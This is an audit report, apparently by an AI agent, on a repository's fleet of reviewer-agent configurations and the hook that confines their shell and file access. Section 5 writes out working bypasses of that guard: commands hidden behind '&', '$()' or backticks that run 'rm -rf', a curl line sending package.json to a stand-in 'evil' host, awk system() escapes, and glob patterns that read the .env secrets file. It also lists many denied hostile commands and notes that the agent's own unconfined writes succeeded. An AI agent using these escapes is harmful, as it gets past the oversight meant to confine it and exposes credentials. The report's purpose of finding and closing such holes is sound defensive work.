# Fleet Audit — run 2026-08-15T2109

**Auditor:** `fleet-maintainer` · **Date:** 2026-08-16 · **Repo:** `/Users/ofeklevy/cebu` @ `main` (`2d187e3`)
**Subject:** `.claude/**`, audited adversarially against the repository. `reference/stack.md` was
treated as the **subject**, not the source — every factual claim below was re-derived from the code.

**Context:** a 16-agent whole-codebase review is in flight against this commit. Findings marked
**[LIVE-RUN IMPACT]** are actively corrupting that run's output right now.

| | Count |
|---|---|
| Blocking | 5 |
| Drift (false claims) | 12 |
| Coverage gaps | 9 |
| Ownership overlaps | 5 |
| Guard bypasses (new, reproduced) | 6 |

**Verdict:** the Express/MySQL class of error is genuinely gone — the big structural facts in
`stack.md` (52 tables, 145 uuid columns, 58+12+1 migrations, runner clean in both directions,
27 v1 + 7 admin controllers, 9 Playwright configs, three LLM providers, Fastify 4 / pg-boss 12 /
Next 15.1 / pnpm 11.4.0) all re-verified **true** on `main` today, and **every code path cited by
every agent resolves**. What has rotted is narrower and sharper: one agent tells its reviewer the
LLM layer has a fourth provider that does not exist, one contradicts `stack.md` on the table count,
the test count is stale by 8, the guard's `readonly` Bash allowlist has six working shell escapes,
and a new agent was added with no guard block at all.

---

## 0. Discoverability — PASS

- `.claude/agents/` is at the **repo root** (`/Users/ofeklevy/cebu/.claude/agents/`). The v1 defect
  (fleet buried at `podcast-saas/.claude/agents/`) is fixed. Agents load from the working directory.
- One other `.claude/` exists — `podcast-saas/client-web/.claude/` — but it contains **only**
  `agent-memory/{fleet-maintainer,fiji-advisor}/` and **no `agents/` subdirectory**, so it shadows
  nothing. (It does cause BLOCK-3 below.)
- **25 agent files, 25 unique `name:` values.** No duplicates, no `:` in any name, all
  lowercase-hyphen. Every name referenced by `review-orchestrator.md` and `review/README.md`
  resolves to a real file.

---

## 1. Blocking

### BLOCK-1 — `task-tracker` runs with **no fleet guard at all** [LIVE-RUN IMPACT]
- `location: .claude/agents/meta/task-tracker.md:1-6` (entire frontmatter)
- The file is:
  ```yaml
  name: task-tracker
  description: …
  tools: Bash, Read, Grep, Glob, WebFetch
  model: sonnet
  ```
- There is **no `hooks:` block** and **no `disallowedTools:`**. Every other one of the 24 agents
  carries `hooks.PreToolUse → fleet-guard.mjs readonly`. This agent has unrestricted `Bash`.
- `.claude/settings.json` catches only the **secrets** half (`fleet-guard.mjs secrets`, which
  `exit 0`s at line 236 before any of Rules 2 and 3). So `task-tracker` can `git commit`,
  `git push`, `rm -rf`, `pnpm install`, `psql`, `docker compose down` — none of which the
  `readonly` mode would allow. This is exactly bypass class B13 that `settings.json` was created to
  close; `settings.json` closes only its secrets half.
- It is also invisible to the fleet: absent from `review/README.md` (which still says
  "The fleet — 24 agents" at `:45`), absent from `PROTOCOL.md` §3's ownership matrix, and absent
  from `review-orchestrator.md`'s dispatch table.
- The file is **untracked** (`?? .claude/agents/meta/task-tracker.md`), i.e. it entered the fleet
  without review.

### BLOCK-2 — `fleet-maintainer` cannot run the guard's own regression suite
- `location: .claude/agents/meta/fleet-maintainer.md:63` instructs running the guard self-test;
  `.claude/hooks/fleet-guard.mjs:155` reads
  `if (verb === 'node' && !/fleet-guard\.mjs|--version/.test(seg)) return 'node may only run --version or the fleet guard self-test';`
- `fleet-guard.test.mjs` does **not** contain the substring `fleet-guard.mjs`, so the self-test is
  denied by the guard it tests:
  ```
  DENY  node .claude/hooks/fleet-guard.test.mjs
        <- node may only run --version or the fleet guard self-test
  ```
- Fix: widen to `/fleet-guard(\.test)?\.mjs|--version/`.

### BLOCK-3 — agent memory writes are denied at the path the runtime actually uses
- `location: .claude/hooks/fleet-guard.mjs:250-251` allowlists
  `resolve(REPO, '.claude/agent-memory')` and `.claude/agent-memory-local`.
- The directory that actually exists is
  `/Users/ofeklevy/cebu/podcast-saas/client-web/.claude/agent-memory/{fleet-maintainer,fiji-advisor}/`.
  Verified verdict:
  ```
  DENY  Write /Users/ofeklevy/cebu/podcast-saas/client-web/.claude/agent-memory/fleet-maintainer/x.md
  ALLOW Write /Users/ofeklevy/cebu/.claude/agent-memory/fleet-maintainer/x.md   (dir does not exist)
  ```
- Every `memory: project` agent (20 of them) is structurally unable to persist memory when the
  frontmatter hook is live. Fix: allowlist any resolved path whose suffix is
  `/.claude/agent-memory/` or `/.claude/agent-memory-local/`, not just the repo-root one.

### BLOCK-4 — `fiji-advisor`'s mandatory Step 0 is denied by its own guard
- `location: .claude/agents/meta/fiji-advisor.md:28-30` — the agent is told to run, **first, every
  time**: `for d in ./fiji ../fiji ~/cebu/fiji ~/fiji; do [ -d "$d/.git" ] && echo "FIJI FOUND: $d"; done`
- `readonly` verdict: `DENY <- 'for' is not on the reviewer command allowlist`
  (`fleet-guard.mjs:144`, `READ_VERBS` has no shell keywords).
- The agent therefore cannot establish `mode: verified` vs `mode: unverified` the way its prompt
  requires. Fix: replace the loop with `ls -d ./fiji ../fiji ~/cebu/fiji ~/fiji 2>/dev/null` (verb
  `ls`, allowed), or add `for`/`do`/`done`/`if`/`then`/`[` to `READ_VERBS`.

### BLOCK-5 — `llm-pipeline-reviewer` declares a skill that does not exist
- `location: .claude/agents/domain/llm-pipeline-reviewer.md:14` — `skills: claude-api`
- `.claude/skills/` contains only `release-audit/` and `ship/`; there is no user-level
  `~/.claude/skills/` and no `claude-api` anywhere in the tree. `release-audit` (used by
  `release-auditor.md:15` and `incident-reporter.md:15`) resolves correctly, so the field is
  otherwise wired right. Either add the skill or drop the line.

---

## 2. Drift — each claim vs. the repository

Ranked by blast radius on the run in flight.

### D1 — `llm-pipeline-reviewer` believes there is a fourth LLM provider [LIVE-RUN IMPACT] — **highest**
- **Agent says** — `.claude/agents/domain/llm-pipeline-reviewer.md:3`:
  > "provider abstraction and fallback across **Anthropic/OpenAI/Gemini/Groq**"
- **Truth** — `podcast-saas/backend-api/src/services/llm/` contains exactly
  `ClaudeProvider.ts`, `OpenAIProvider.ts`, `GeminiProvider.ts` (+ the `LLMProvider.ts` interface).
  There is **no `GroqProvider`**. `groq-sdk` is used only for transcription, in
  `podcast-saas/backend-api/src/services/captions/CaptionService.ts` and
  `podcast-saas/backend-api/src/services/ingestion/AudioIngester.ts`.
- **`stack.md` already says this** at `:70-71` — "Three: Anthropic, OpenAI, Google GenAI …
  ~~Groq is a fourth LLM provider~~ … There is no `GroqProvider`; it is **not** part of the LLM
  abstraction." The agent's own description contradicts the SSOT. Per `PROTOCOL.md:7-9` this is
  itself a `fleet` finding, which is why it is first.
- **Why it matters:** this is the Express/MySQL shape exactly. A reviewer hunting "fallback across
  four providers" will report a missing Groq fallback path, missing Groq timeout handling, and
  missing Groq token accounting — three fabricated findings about a provider that does not exist.
- This edit was recommended by the 2026-08-14 audit (`FLEET-AUDIT.md:557`, "Drop Groq") and **was
  never applied**.

### D2 — the same false count of LLM providers in two more agents [LIVE-RUN IMPACT]
- **`.claude/agents/core/security-reviewer.md:24`:** "…with a local-disk fallback, **four LLM providers**."
- **`.claude/agents/domain/dependency-auditor.md:40`:** "…`stripe`, **the four LLM SDKs** — and check
  the pinned range against published advisories."
- **Truth:** `podcast-saas/backend-api/package.json` declares three LLM SDKs — `@anthropic-ai/sdk`
  `^0.38.0`, `openai` `^4.86.0`, `@google/genai` `^1.0.0` — plus `groq-sdk` `^0.8.0`, which is ASR.
- `dependency-auditor` will go looking for advisories on a fourth LLM SDK, or silently mis-bucket
  `groq-sdk` as an LLM dependency in its report.

### D3 — `database-reviewer` contradicts `stack.md` on the table count [LIVE-RUN IMPACT]
- **Agent says** — `.claude/agents/core/database-reviewer.md:36`: "`schema.ts` (**53 pgTables**)"
- **SSOT says** — `.claude/reference/stack.md:61`: "(**52** tables, 145 uuid columns)"
- **Truth:** `podcast-saas/backend-api/src/db/schema.ts` has **52** `export const … = pgTable(`
  declarations and **145** `uuid(` columns. `stack.md` is right; the agent is wrong.
- The 2026-08-14 audit fixed `stack.md:60` (`53 → 52`) but never propagated the fix into
  `database-reviewer.md`. Two files, two numbers, one of them false.

### D4 — `database-reviewer` describes a "71-file migration runner"
- **Agent says** — `.claude/agents/core/database-reviewer.md:3`:
  > "schema design, the **71-file migration runner**"
  and `:36`: "`migrations/` (71 `.sql`)"
- **Truth:** the **runner** (`podcast-saas/backend-api/src/db/migrate.ts:25`) hardcodes **58**
  filenames. **71** is the on-disk file count: 58 forward + 12 `*.rollback.sql` +
  `phase2-schema.sql` (commented-out, `migrations/phase2-schema.sql:1` — "PHASE 2+ tables — DO NOT
  create in Phase 1 migrations"). Calling the runner "71-file" tells the reviewer to expect 13
  entries in `migrate.ts` that are not there and never should be.
- `stack.md:62` states this correctly. Same missed propagation as D3; also recommended on
  2026-08-14 (`FLEET-AUDIT.md:556`) and never applied.
- **Re-verified clean:** I diffed the 58 forward `.sql` filenames on disk against the 58 entries in
  `migrate.ts:25`. **Zero drift in either direction**, order matches filename sort. The
  `migrations.not-in-runner` / `missing-file` risk described at `stack.md:126-132` is currently
  not realised — but the claim's *verification stamp* is stale (see D11).

### D5 — the backend test count is stale by 8 [LIVE-RUN IMPACT]
- **SSOT says** — `.claude/reference/stack.md:68`: "**Vitest** (**128** `*.test.ts` under
  `backend-api/src`, excluding `_archive/`)"
- **Agent says** — `.claude/agents/core/test-quality-reviewer.md:21`: "**Vitest** (128 backend test
  files)"; and `:70`: "**Counting test files as coverage.** 128 files can still leave the export
  path untested."
- **Truth: 136.** `find podcast-saas/backend-api/src -name '*.test.ts' -not -path '*/_archive/*'`
  → **136**; including `_archive/` → 139 (3 archived). This matches the 136 you measured today.
- The 2026-08-14 audit recommended `128 → 131` (`FLEET-AUDIT.md:547,557`). That edit was never
  applied, and the true value has since moved to 136. **The stale number has now drifted twice.**

### D6 — `fiji.md` describes a traversal exposure that has been fixed
- **KB says** — `.claude/reference/fiji.md:30`:
  > "| Storage | Multi-cloud `StorageService` … | R2 read-only → **local-disk fallback served via
  > raw `path.join`** ⚠️ |"
- **Truth:** every local-disk serve now goes through the containment helper.
  `podcast-saas/backend-api/src/server.ts:11` imports `{ safeLocalPath, keyHasTraversal }` and all
  four serve/write sites use it — `server.ts:284`, `:305`, `:375`, `:536` — as do
  `services/storage/serveFile.ts`, `services/storage/LocalStorageAdapter.ts`, and
  `controllers/sim-public.controller.ts`. `services/storage/pathSafety.ts:9,20` exports
  `safeLocalPath()` and `keyHasTraversal()`.
- **Why it matters:** `fiji-advisor.md:77-79` names this its **"canonical example"** and signature
  case #1. The advisor will now propose a presigned-URL re-architecture to fix a hole that was
  already closed, and will justify it by citing a premise that is false. `stack.md:171-174` already
  describes the current (correct) design — `fiji.md` is the one that rotted.
- Note this is a *stale exposure claim*, not a stale design claim: fiji's `StorageService` pattern
  may still be worth porting. The drift is the "⚠️ raw `path.join`" assertion about **FlowVid**.

### D7 — `stack.md` script count
- **Says** — `.claude/reference/stack.md:105`: "`.../src/scripts/**` (**31** backfill/audit scripts)"
- **Truth: 29** `.ts` files in `podcast-saas/backend-api/src/scripts/` (the other two entries are
  the `lib/` and `__tests__/` directories).

### D8 — `stack.md` job row names a job that is not a job
- **Says** — `.claude/reference/stack.md:96`: "`.../src/jobs/**` | **`corpus.ingest`**,
  `video.generate`, `video.transcode` | `job-queue-reviewer`"
- **Truth:** `podcast-saas/backend-api/src/queue/types.ts:11` defines
  `JobName = 'transcode' | 'captions' | 'crop' | 'metadata' | 'podcast_script' | 'podcast_render' |
  'podcast_clips' | 'podcast_mix_export' | 'video_generate' | 'project_duplicate' | 'project_export'`
  — **11 names, and `corpus.ingest` is not one of them.** The file
  `podcast-saas/backend-api/src/jobs/corpus.ingest.ts` exists but is not a registered job type.
- `observability-reviewer.md:43,68` gets this right ("the 11 job names in `queue/types.ts`"), so the
  two documents disagree. A `job-queue-reviewer` working from `stack.md`'s three filenames will
  review 3 of 11 job paths and believe it swept the subsystem.
- Also recommended on 2026-08-14 (`FLEET-AUDIT.md:551`) and never applied.

### D9 — `stack.md` verification stamp is stale
- **Says** — `.claude/reference/stack.md:12`: "**Last verified:** 2026-08-14 against
  `feat/agent-fleet-upgrade`."
- **Truth:** HEAD is `main` @ `2d187e3` ("Merge pull request #29 … fix/export-capture-package-root").
  Two merges landed since (`#28` ship-conductor, `#29` export-capture-package-root), plus an
  untracked new service `podcast-saas/backend-api/src/services/export/capture/localCaptureProvider.ts`.
  Re-stamp to `main` @ `2d187e3`, dated 2026-08-16.

### D10 — `review/README.md` agent count
- **Says** — `.claude/review/README.md:45`: "## The fleet — **24 agents**"
- **Truth:** 25 files under `.claude/agents/**`, 25 unique names (`task-tracker` is the 25th).

### D11 — the migration-audit "verified clean" stamp is dated, not the claim
- `.claude/reference/stack.md:130-131`: "**Verified clean on 2026-08-14** (run `2026-08-13T2227`):
  all 58 forward migrations are present in the runner list…"
- The *claim* re-verified **TRUE** today (see D4). The *stamp* points at a run that is three days
  and two merges old. Not false, but it invites the exact trust-the-cache failure this file exists
  to prevent. Re-stamp alongside D9.

### D12 — `.env.example` groups omit a live secret
- `.claude/reference/stack.md:151-164` enumerates the config surface "by name". It is explicitly a
  summary ("Key groups"), so most omissions are legitimate simplification — but
  **`REVALIDATE_SECRET`** is a genuine shared secret in `podcast-saas/.env.example` that falls into
  none of the eight listed groups, alongside `TRIGGER_SECRET_KEY`, `FIRECRAWL_API_KEY`,
  `LLAMAPARSE_API_KEY`, `DOCLING_URL`, `ADMIN_API_URL`. `config-deploy-reviewer`, whose job at
  `:32` is "`.env.example` (**names only**) … versus what the code reads", is working from an
  incomplete list. Low severity; listed for completeness.

### Explicitly re-verified TRUE (do **not** "fix" these)
`stack.md:61` 52 tables ✓ · 145 uuid columns ✓ · `:62` 58 forward + 12 rollback + 1 commented = 71 ✓ ·
runner list complete and order-correct, zero drift both directions ✓ · `:91` 27 v1 controllers ✓ ·
`:92` 7 admin controllers ✓ · `:68` 9 Playwright configs in `client-web` ✓ · `:70` three LLM
providers ✓ · `:58` Fastify `^4.28.0` ✓ · `:60` `drizzle-orm/postgres-js` + `postgres` `^3.4.4` ✓ ·
`:63` pg-boss `^12.23.0` + `inlineDriver.ts` ✓ · `:66` Next `15.1.0` / React 19 / Tailwind 3.4 in
both frontends ✓ · `:50` pnpm@11.4.0, Node >=22 (local v22.23.2), six workspace packages ✓ ·
`:69` Docker Compose + nginx + systemd under `podcast-saas/deploy/` ✓ · `:74-82` all four "traps"
(stale `CLAUDE.md` describing GoDaddy/MySQL/Express, dead `tsoa.json` with zero `tsoa` imports,
root `generate` script pointing at a nonexistent `backend-api` script, GoDaddy-era `start` +
duplicate `workspaces` array) ✓ · **every code file path cited by every one of the 25 agents
resolves to a real file** (75 distinct basenames checked; zero dead paths).

---

## 3. Coverage gaps

### C1 — `podcast-saas/ops/ship/**` has no agent that names it — **not adequate**
- **Zero** agent files contain the string `ops/ship`. The only assignment is the matrix row at
  `.claude/reference/stack.md:112` → `release-auditor`, `backend-reviewer`.
- Neither owner's own scope reaches it: `release-auditor.md:24-29` scopes the deterministic **JSON
  outputs** (`release-report.json`, `gate.json`, `vm-audit.json`, `browser-audit.json`, `csp-*.json`,
  `image-manifest.json`), and `backend-reviewer.md:33-38` scopes
  `podcast-saas/backend-api/src/**` only, enumerated file-by-file with no `ops/` entry.
- The subsystem is 13 source files (`cli.ts`, `conductor.ts`, `gh.ts`, `git.ts`, `journal.ts`,
  `report.ts`, `run.ts`, `state.ts`, `collect.ts`, `config.ts`, `types.ts` + tests) that drive
  **PR → CI → merge → release → approval → deploy** via `gh`, and it landed only two commits ago
  (`420f56d feat(ship): one command from branch to audited release`). A default matrix row with no
  agent-side scope entry means it is **unreviewed**, and `stack.md:103` states the fleet's own
  principle: "**an unlisted directory is an unreviewed one**."

### C2 — `podcast-saas/backend-api/src/scripts/**` has no agent that names it — **not adequate**
- **Zero** agent files contain `src/scripts`. Only `stack.md:105` assigns it, to `backend-reviewer`
  "by default" — but `backend-reviewer.md:33-38` enumerates its scope
  (`server.ts`, `controllers/v1/**`, `controllers/admin/v1/**`, `middleware/**`, `lib/**`, named
  services, named loose files) and **`scripts/` is not in the list**.
- 29 scripts that touch production data, including
  `seed-sim-pool-from-production.DO-NOT-USE-IN-E2E.ts`, `fix-migration-tracking.ts`,
  `backfill-storage.ts`, `backfill-localhost-urls.ts`, `rebuild-sim-bridges.ts`,
  `classify-orphan-sim-rows.ts`. `stack.md:105` itself says they are in scope precisely because
  "they touch production data … reviewed for correctness and for destructive-by-default behaviour"
  — the requirement is stated and then not delegated to anyone who will act on it.

### C3 — `podcast-saas/md-files/**` (22 architecture/plan docs) has no owner anywhere
- Not in `stack.md` §3, not in `PROTOCOL.md` §3, not in any agent scope.
- Contents include `SIM-RUNTIME-PROTOCOL-V3.md`, `LINEAR-VIDEO-EXPORT-PLAN.md`,
  `podcast-pipeline-architecture.md`, `llm-integration-guide.md`,
  `EXPORT-CAPTURE-ISOLATION.md`, `client-admin-ai-architecture.md`.
- **This is the highest-risk unowned surface in the repo**, because it is the same failure mode
  that created this agent: `podcast-saas/CLAUDE.md` is stale boilerplate that told the v1 fleet the
  stack was Express/MySQL. `stack.md:74-76` quarantines `CLAUDE.md` by name but nothing audits the
  22 documents next to it. An agent that reads `md-files/llm-integration-guide.md` for context has
  no signal about whether it is current.

### C4 — `podcast-saas/references/**` has no owner
- `references/crop-processor/{PIPELINE.md,reference-python/}` and
  `references/reference-podcast/{ELEVEN-V3-SPEC.md,HOST.md,SKILL-PODCAST.md,epsold-01.txt}`.
  A Python reference implementation and vendor specs, unassigned and unquarantined. Same class as C3.

### C5 — `podcast-saas/backend-api/src/services/firebase.ts` has no owner
- Not in `stack.md` §3 (which enumerates service **directories**, plus a named list of loose files),
  and no agent file mentions `firebase.ts`. It is the Firebase Admin bootstrap sitting beside the
  auth middleware that `security-reviewer` does own (`middleware/firebase-auth.ts`).

### C6 — top-level controllers are owned by agents but missing from the `stack.md` map
- `stack.md:91-92` lists only `controllers/v1/**` and `controllers/admin/v1/**`. Three files sit
  directly in `podcast-saas/backend-api/src/controllers/`:
  `sim-public.controller.ts`, `sim-rum.controller.ts`, `stubs.ts`.
- The first two **are** claimed by `simulation-reviewer.md:35-36` and (for RUM)
  `observability-reviewer.md:33`, so they get reviewed — but a reader of `stack.md` alone would
  conclude they are unowned. `stubs.ts` is claimed by nobody.
- `sim-public.controller.ts` is not trivial: it is the only file that registers `@fastify/compress`
  scoped (`:2`, `:91`, `:268`) and it calls `safeLocalPath`.

### C7 — `podcast-saas/deploy/docker-compose.capture.yml` is outside the enumerated scope
- `config-deploy-reviewer.md:31-32` enumerates "`docker-compose.yml`,
  `docker-compose.export-worker.yml`, `docker/`, `nginx/`, `systemd/`, `scripts/`".
  `deploy/` also contains **`docker-compose.capture.yml`**, and the repo root has a second
  `podcast-saas/docker-compose.yml`. Neither is named.

### C8 — `client-web` directories outside the frontend scope
- `frontend-reviewer.md:20-21` scopes `client-web/{app,components,hooks,lib,middleware.ts}`.
  Also present and unnamed by any agent: `client-web/e2e/`, `client-web/scripts/`,
  `client-web/docs/`, `client-web/public/`, `client-web/__tests__/`, `vitest.setup.ts`, `dev.sh`.
- `e2e/` is nominally `test-quality-reviewer`'s by the `PROTOCOL.md:114` matrix row ("Playwright
  suites"), but that agent's own scope section names only the nine **configs**, never the spec
  directory.

### C9 — `podcast-saas/ops/release/src/**` source is unowned; only its outputs are owned
- 20+ TypeScript files (`migration-audit.ts`, `csp-audit.ts`, `database-url-audit.ts`,
  `remote-deploy.ts`, `remote-commands.ts`, `preflight.ts`, `image-manifest.ts`, `redact.ts`, …).
- `release-auditor.md:24-29` and `migration-auditor.md:20,27,37` both scope the **JSON artefacts**
  these files produce, never the producing code. `stack.md:129` even relies on
  `ops/release/src/migration-audit.ts` being correct — nobody reviews it.
- Nine agents merely *mention* `ops/release`; none scopes its source.

---

## 4. Ownership overlaps and matrix gaps

`PROTOCOL.md:19` states "**Ownership is exclusive.** Each concern has exactly one owning agent."
Five places break that.

| # | Concern | Claimed by | Conflict |
|---|---|---|---|
| O1 | `services/seo/**` | `backend-reviewer.md:35` ("`seo/`") **and** `llm-pipeline-reviewer.md:37` ("`services/seo/**`") | `stack.md:103` assigns it to `backend-reviewer` only. Two agents will both review it, or both assume the other did. |
| O2 | `services/podcast/**` | `backend-reviewer.md:35` claims `podcast/` **wholesale** | `stack.md:104` splits it three ways (`prompts/schemas/scriptLint/ScriptRoom/runPodcastScript` → `llm-pipeline`, `audio/**` → `media-pipeline`, rest → `backend`). `llm-pipeline-reviewer.md:36` and `media-pipeline-reviewer.md:40` claim their slices. Backend's blanket claim overlaps both. |
| O3 | `backend-api/src/lib/**` | `backend-reviewer.md:34` claims `lib/**` | `observability-reviewer.md:29` claims `lib/{logger.ts,sse.ts,fetchWithRetry.ts}` and `billing-integrity-reviewer.md:25` claims `lib/rateLimit.ts` — between them, **all four files in `lib/`**. `stack.md:107` splits `lib/` between observability and config-deploy and never mentions backend. Backend's `lib/**` is wholly redundant. |
| O4 | `controllers/sim-rum.controller.ts` | `simulation-reviewer.md:36` **and** `observability-reviewer.md:33` | Genuinely dual-natured; needs an explicit tie-break line like the one `media-pipeline-reviewer.md:43-45` already uses ("Raw concurrency cost is `performance-reviewer`'s"). |
| O5 | `ops/ship/**` | `stack.md:112` assigns **two** owners (`release-auditor`, `backend-reviewer`) with no split-by-concern | Compare `stack.md:102` and `:104`, which do split correctly. See C1 — in practice this resolves to zero owners. |

**Matrix gaps in `PROTOCOL.md` §3 (`:105-127`):** no row for `task-tracker`; no row covering
`ops/ship`; no row covering `backend-api/src/scripts/**`; no row covering repo documentation
(`md-files/`, `references/`, `CLAUDE.md`). The `migration-auditor` / `database-reviewer` tie-break
at `:124` is present and correct — that pattern should be reused for O1–O5.

---

## 5. Enforcement — guard verdicts, verbatim

### 5.1 Regression suite
```
$ node .claude/hooks/fleet-guard.test.mjs
fleet-guard regression: 44/44 passed
EXIT=0
```

### 5.2 The four required checks — **all correct**
```
DENY   Read   {"file_path":"/x/.env"}                                    mode=readonly   (expected deny)
DENY   Edit   {"file_path":"/x/a.ts"}                                    mode=readonly   (expected deny)
ALLOW  Edit   {"file_path":"/x/a.ts"}                                    mode=writer     (expected allow)
ALLOW  Bash   pnpm -C podcast-saas --filter backend-api test             mode=readonly   (expected allow)
```

### 5.3 The bypasses `PROTOCOL.md` §5 says were closed — **all confirmed closed**
```
DENY   sed -i s/a/b/ podcast-saas/backend-api/src/server.ts
DENY   echo x | tee podcast-saas/a.ts
DENY   echo x > podcast-saas/a.ts
DENY   echo x >> podcast-saas/a.ts
DENY   Write .claude/review/runs/x/../../../podcast-saas/a.ts        (the `..` walk)
DENY   Grep path=podcast-saas/.env
DENY   Read /x/.ENV                                                  (case-insensitive APFS)
DENY   git -C podcast-saas push origin main                          (readonly AND writer)
DENY   pnpm -C podcast-saas install                                  (readonly)
DENY   pnpm -C podcast-saas add lodash                               (writer)
DENY   npx tsx podcast-saas/backend-api/src/db/migrate.ts            (readonly AND writer)
DENY   rm podcast-saas/a.ts                                          (readonly AND writer)
DENY   scp podcast-saas/.env vm:/tmp/
DENY   echo $DATABASE_URL                                            (readonly AND secrets)
DENY   printenv
DENY   dd if=podcast-saas/.env
DENY   node -e "console.log(1)"
DENY   curl file:///x/.env
DENY   WebFetch url=file:///x/.env
DENY   cat < podcast-saas/.env                                       (input redirection)
ALLOW  Read podcast-saas/.env.example                                (correctly still readable)
```
Also correctly denied, un-prompted: `bash -c`, `sh -c`, `zsh -c`, `env <cmd>`, `python3 -c`,
`perl -pi -e`, `ruby -e`, `cp`, `ln -s`, `install`, `truncate`, `busybox sh -c`, `xargs rm`,
`chmod`, `touch`, `mkdir`, `patch`, `npx prettier --write`, `find -exec/-delete`,
`awk 'BEGIN{print > "/tmp/pwn"}'`, `cat package.json > >(head)`, `git checkout -b`,
`git config user.email …`, `git stash push`, `git tag -l ; git push`, `V=DATABASE_URL; echo ${!V}`,
`P=".e"; Q="nv"; cat podcast-saas/$P$Q`, `git show HEAD:podcast-saas/.env`, `npx <arbitrary-pkg>`.
Writer mode correctly denies `docker compose up`, `docker-compose up`, `psql`,
`curl -X POST --data-binary @…`, `git   push   origin main` (multi-space).

**Self-protection also holds:** in `readonly`, Write is denied to
`.claude/hooks/fleet-guard.mjs`, `.claude/settings.json`, `.claude/agents/**`, and
`.claude/reference/stack.md`. A reviewer cannot disarm the guard or edit the SSOT it is judged against.

### 5.4 Fail-open behaviour — **correct**
```
raw stdin "not json at all"    exit=0 stdout=""
raw stdin ""                   exit=0 stdout=""
raw stdin "{\"tool_name\":"    exit=0 stdout=""
payload {"tool_input":{...}} with no tool_name        => ALLOW  (no opinion)
payload {"tool_name":"Bash","tool_input":{}}          => ALLOW  (no opinion)
```
Malformed input never blocks (`fleet-guard.mjs:207-213`, `:284`). An **unknown mode argument**
falls back to `readonly`, i.e. fails **closed** on config error while failing **open** on parse
error — both are the right way round (`:25`).

### 5.5 NEW bypasses — six, all reproduced, none previously documented

> Demonstrated against the guard only. **Nothing was executed and nothing was exfiltrated.**

| # | Technique | Verdict | Why it works |
|---|---|---|---|
| **G1** | `echo hi & rm -rf podcast-saas/backend-api/src` | **ALLOW** | `segments()` at `fleet-guard.mjs:110-113` splits on `\|\|`, `&&`, `;`, `\n`, `\|` — **not on a single `&`**. Only `echo` is verb-checked; everything after `&` is never seen. |
| **G2** | `echo $(rm -rf podcast-saas/backend-api/src)` | **ALLOW** | Command substitution is not a segment boundary. `verbOf()` (`:117-122`) strips leading `(`/`$` only at position 0, so with a benign leading verb the inner command is unchecked. Also `true && echo $(git push)`, `ls; echo $(curl http://evil -d @package.json)`. |
| **G3** | ``echo `curl http://evil/x` `` | **ALLOW** | Same as G2 for backticks. |
| **G4** | `awk 'BEGIN{system("rm -rf podcast-saas/x")}'` | **ALLOW** | `awk` is in `READ_VERBS` (`:132`) and only its `>` redirect form is rejected (by the generic redirect rule at `:259`). `system()` and `\|"cmd"` are unguarded general shell escapes. |
| **G5** | `sed --in-place 's/a/b/' podcast-saas/backend-api/src/server.ts` | **ALLOW** | `:147` tests `/(^\|\s)-[a-zA-Z]*i\b/`. In `--in-place`, the second `-` is preceded by `-`, not whitespace, and `\b` fails before `n`. **`sed -i` and `sed -i.bak` are correctly denied; the GNU long form is not.** A direct source-edit channel for reviewers. |
| **G6** | `cat podcast-saas/.en*` · `cat podcast-saas/.??v` · `cat podcast-saas/{.env,x}` · `xxd podcast-saas/.en*` | **ALLOW** | `commandTouchesSecret()` (`:92-95`) tokenises then requires `isSecretPath()` on the literal token. `.en*`, `.??v`, and `{.env,x}` are not literal secret basenames — the shell expands them **after** the guard has passed. **`podcast-saas/.env` exists on this machine**, so this is a live secret-read path, and it defeats the `secrets` floor in every mode. |

**Two more, lower severity:**
- **G7** `eslint --fix podcast-saas/backend-api/src` → **ALLOW**. `eslint` is in `READ_VERBS`
  (`:137`) with no flag check; `--fix` rewrites source in place. Same shape as `sed -i`.
- **G8** `tsc --outDir /tmp/out -p podcast-saas/backend-api` → **ALLOW**. `tsc` is in `READ_VERBS`
  with no flag check and writes files wherever `--outDir` points.

**Severity:** G1–G4 are *complete* escapes from the `readonly` allowlist — with any one of them a
reviewer has full shell. That collapses the model `fleet-guard.mjs:11-12` claims ("Bash is an
ALLOWLIST … Anything else is denied by default") back toward the v1 denylist the rewrite was meant
to replace. G6 defeats the one guarantee `PROTOCOL.md:186-190` states unconditionally
("**Secrets.** … denied … including by another name, by another reader, by redirection, and by
expansion") — glob expansion is the gap in that list.

### 5.6 The guard is not actually armed for the fleet right now [LIVE-RUN IMPACT]
During this audit, running as `fleet-maintainer` (whose frontmatter declares
`fleet-guard.mjs readonly`):
- a Bash command containing `.env` **was denied** → the `.claude/settings.json` `secrets` floor is live;
- `Write` to `/private/tmp/...` **succeeded**, and `node <arbitrary-script>.mjs` **succeeded** →
  both of which `readonly` denies (`:243-256`, `:155`).

So **only the project-wide `secrets` hook is firing; the per-agent frontmatter hooks are not.**
`PROTOCOL.md:200-201` predicts exactly this ("frontmatter hooks are skipped until you accept the
workspace trust dialog") and `settings.json`'s own `$comment` documents it as bypass B13. The
consequence for the run in flight: the 16 reviewers have **no** Bash allowlist, **no** Write
confinement, and **no** hook-level Edit denial. `disallowedTools: Edit, NotebookEdit` is still
enforced by the tool layer, so reviewers cannot Edit — but Bash is wide open. Accept workspace
trust, or promote `readonly` into `settings.json`, before relying on the guard's guarantees.

### 5.7 The guard blocks commands the fleet's own documentation tells agents to run
| Command | Where it is prescribed | Verdict |
|---|---|---|
| `for d in ./fiji ../fiji ~/cebu/fiji ~/fiji; do …` | `fiji-advisor.md:29` | **DENY** `'for' is not on the reviewer command allowlist` |
| `node .claude/hooks/fleet-guard.test.mjs` | `fleet-maintainer.md:63` | **DENY** `node may only run --version or the fleet guard self-test` |
| `pnpm -C podcast-saas --filter shared build` | `stack.md:46` | **DENY** `pnpm/npm script 'build' is not read-only` |
| `gh run list` / `gh pr view` | pre-authorised in `settings.json` `permissions.allow` | **DENY** `'gh' is not on the reviewer command allowlist` |

The last one is a **policy contradiction**: `settings.json` pre-authorises seven `gh` verbs so a
shipment runs without prompts, while `readonly` denies `gh` outright. Both may be intended
(reviewers genuinely should not call `gh`), but it should be stated rather than discovered.
`pnpm audit` is also denied — `dependency-auditor.md:25-26,80` explicitly acknowledges and plans
around this, so that one is **correct by design, not a defect**.

---

## 6. Hygiene

- **Frontmatter validity: 25/25 pass the hard checks.** Every `name` is lowercase-hyphen with no
  `:`; every `model` is `opus` or `sonnet`; every `effort` is `high` or `medium`; every `memory` is
  `project`; every `color` is a valid name. **Every tool name in every `tools`/`disallowedTools`
  list is a real tool** — notably `review-orchestrator.md:8` correctly declares `Agent` (not the
  non-existent `Task`), and it is the **only** agent that carries `Agent`.
